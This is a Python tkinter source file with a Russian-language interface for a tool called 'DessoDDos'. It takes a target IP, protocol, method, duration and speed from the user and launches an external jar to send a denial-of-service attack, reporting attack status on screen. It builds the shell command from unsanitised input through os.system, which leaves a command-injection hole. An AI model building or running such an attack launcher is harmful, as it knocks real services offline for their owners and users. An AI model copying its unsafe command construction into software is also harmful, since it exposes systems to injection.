import time
import os
import tkinter as tk

def write_log(message):
    with open('logs.log', 'a') as log_file:
        log_file.write(f'{message}\n')

write_log(f'Запуск программы DessoDDos GUI By XXXs2 в {time.strftime("%Y-%m-%d %H:%M:%S")}')

root = tk.Tk()
root.title("DessoDDos GUI")

background_image = tk.PhotoImage(file="2.png")
background_label = tk.Label(root, image=background_image)
background_label.place(x=0, y=0, relwidth=1, relheight=1)

def start_attack():
    ip = ip_entry.get()
    protocol = protocol_entry.get()
    method = method_entry.get()
    duration = duration_entry.get()
    speed = speed_entry.get()

    write_log(f'Начало атаки на {ip} с использованием протокола {protocol} и метода {method}')

    if not ip or not protocol or not method or not duration or not speed:
        output_label.config(text="Ошибка: Заполните все поля!")
        return

    max_length = 30
    if len(ip) > max_length:
        output_label.config(text=f"Ошибка: Ограничение {max_length} символов!")
        root.update()
        return

    max_length = 3
    if len(protocol) > max_length:
        output_label.config(text=f"Ошибка: Ограничение {max_length} символов!")
        root.update()
        return

    max_length = 15
    if len(method) > max_length:
        output_label.config(text=f"Ошибка: Ограничение {max_length} символов!")
        root.update()
        return

    max_length = 2
    if len(duration) > max_length:
        output_label.config(text=f"Ошибка: Ограничение {max_length} символов!")
        root.update()
        return

    max_length = 5
    if len(speed) > max_length:
        output_label.config(text=f"Ошибка: Ограничение {max_length} символов!")
        root.update()
        return

    min_length = 10
    if len(ip) < min_length:
        output_label.config(text=f"Ошибка: Минимальное кол-во {min_length} символов!")
        root.update()
        return

    min_length = 3
    if len(protocol) < min_length:
        output_label.config(text=f"Ошибка: Минимальное кол-во {min_length} символов!")
        root.update()
        return

    min_length = 4
    if len(method) < min_length:
        output_label.config(text=f"Ошибка: Минимальное кол-во {min_length} символов!")
        root.update()
        return

    min_length = 2
    if len(duration) < min_length:
        output_label.config(text=f"Ошибка: Минимальное кол-во {min_length} символов!")
        root.update()
        return

    min_length = 2
    if len(speed) < min_length:
        output_label.config(text=f"Ошибка: Минимальное кол-во {min_length} символов!")
        root.update()
        return

    output_label.config(text="Состояние атаки: Атака отправляется...")
    root.update()

    os.system(f'java -jar dessoprogram.jar {ip} {protocol} {method} {duration} {speed}')

    output_label.config(text=f"Состояние атаки: Атака отправлена на айпи - {ip}")
    root.update()

    time.sleep(int(duration))
    output_label.config(text="Состояние атаки: Атака закончена!")
    root.update()
    time.sleep(3)
    return

ip_label = tk.Label(root, text="Введите айпи:", font=("Helvetica", 12))
ip_label.pack(pady=(10, 5))
ip_entry = tk.Entry(root, font=("Helvetica", 12))
ip_entry.pack()

protocol_label = tk.Label(root, text="Введите протокол:", font=("Helvetica", 12))
protocol_label.pack(pady=5)
protocol_entry = tk.Entry(root, font=("Helvetica", 12))
protocol_entry.pack()

method_label = tk.Label(root, text="Введите метод:", font=("Helvetica", 12))
method_label.pack(pady=5)
method_entry = tk.Entry(root, font=("Helvetica", 12))
method_entry.pack()

duration_label = tk.Label(root, text="Введите время:", font=("Helvetica", 12))
duration_label.pack(pady=5)
duration_entry = tk.Entry(root, font=("Helvetica", 12))
duration_entry.pack()

speed_label = tk.Label(root, text="Введите скорость:", font=("Helvetica", 12))
speed_label.pack(pady=5)
speed_entry = tk.Entry(root, font=("Helvetica", 12))
speed_entry.pack()

start_button = tk.Button(root, text="Запустить атаку", font=("Helvetica", 12), command=start_attack)
start_button.pack(pady=(15, 10))

output_label = tk.Label(root, text="Состояние атаки: Вы не запустили атаку")
output_label.pack()

output_label = tk.Label(root, text="Помощь: https://dsc.gg/dessoddos")
output_label.pack()

output_label = tk.Label(root, text="Ошибки: Нету ошибок")
output_label.pack()

root.geometry("453x674")
root.mainloop()
tk.withdraw()
